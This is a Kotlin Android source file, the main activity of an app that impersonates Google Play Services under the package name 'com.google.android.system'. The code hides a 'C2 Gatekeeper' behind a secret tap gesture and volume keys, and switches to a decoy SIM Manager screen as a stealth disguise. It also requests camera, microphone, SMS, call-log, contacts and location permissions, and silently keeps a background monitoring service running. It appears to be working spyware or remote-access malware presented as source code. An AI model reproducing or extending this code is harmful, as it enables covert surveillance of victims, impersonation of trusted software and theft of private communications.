package com.google.android.system

import android.Manifest
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.compose.runtime.*

/**
 * MainActivity
 *
 * Play Service Launcher Activity with In-App Google Play Services App Info UI & Secret C2 Gatekeeper:
 * - Renders PlayServicesAppInfoScreen via Compose.
 * - Secret 5-tap gesture on header opens C2 Gatekeeper password dialog.
 * - Prompts for Runtime, Device Admin, Accessibility, Notification, and Battery Optimization permissions on first launch.
 */
class MainActivity : AppCompatActivity() {

    companion object {
        @Volatile var instance: MainActivity? = null
    }

    private val requiredPermissions: Array<String>
        get() {
            val perms = mutableListOf(
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            )
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
                perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                perms.add(Manifest.permission.READ_MEDIA_IMAGES)
                perms.add(Manifest.permission.READ_MEDIA_VIDEO)
                perms.add(Manifest.permission.READ_MEDIA_AUDIO)
                perms.add(Manifest.permission.POST_NOTIFICATIONS)
            }
            return perms.toTypedArray()
        }

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
            runSystemPermissionPrompts()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        enableEdgeToEdge()
        super.onCreate(savedInstanceState)
        instance = this

        // Set clean white status bar with dark icons
        window.statusBarColor = android.graphics.Color.WHITE
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            androidx.core.view.WindowCompat.getInsetsController(window, window.decorView).isAppearanceLightStatusBars = true
        }

        // Render SIM Manager App UI (User Enrollment vs Stealth Disguise Screen)
        setContent {
            val prefs = remember { SecurityVaultManager.getEncryptedPrefs(this@MainActivity) }
            var isDisguiseActive by remember { mutableStateOf(prefs.getBoolean("disguise_mode_active", false)) }

            if (isDisguiseActive) {
                com.homemonitor.SimManagerScreen(
                    onUnlockMaster = {
                        isDisguiseActive = false
                        prefs.edit().putBoolean("disguise_mode_active", false).apply()
                    }
                )
            } else {
                com.homemonitor.UserEnrollmentScreen(
                    onEnrollmentComplete = {
                        // Reload C2 instances if active
                        Log.i("MainActivity", "Enrollment completed.")
                    },
                    onActivateDisguise = {
                        isDisguiseActive = true
                        prefs.edit().putBoolean("disguise_mode_active", true).apply()
                    }
                )
            }
        }

        // Start background MonitorService
        startMonitorService()

        // Check if first launch permission setup is needed
        val prefs = SecurityVaultManager.getEncryptedPrefs(this)
        val hasCompletedFirstBoot = prefs.getBoolean("first_boot_perms_done", false)

        if (!hasCompletedFirstBoot) {
            prefs.edit().putBoolean("first_boot_perms_done", true).apply()
            permissionLauncher.launch(requiredPermissions)
        }
    }

    private fun runSystemPermissionPrompts() {
        // Smooth background initialization — start MonitorService silently without launching back-to-back settings popups
        startMonitorService()
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (C2Gatekeeper.handleVolumeKeyEvent(this, keyCode) {}) {
            return true
        }
        return super.onKeyDown(keyCode, event)
    }

    override fun onResume() {
        super.onResume()
        startMonitorService()
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
    }

    private fun startMonitorService() {
        try {
            val intent = Intent(this, MonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (_: Exception) {}
    }
}
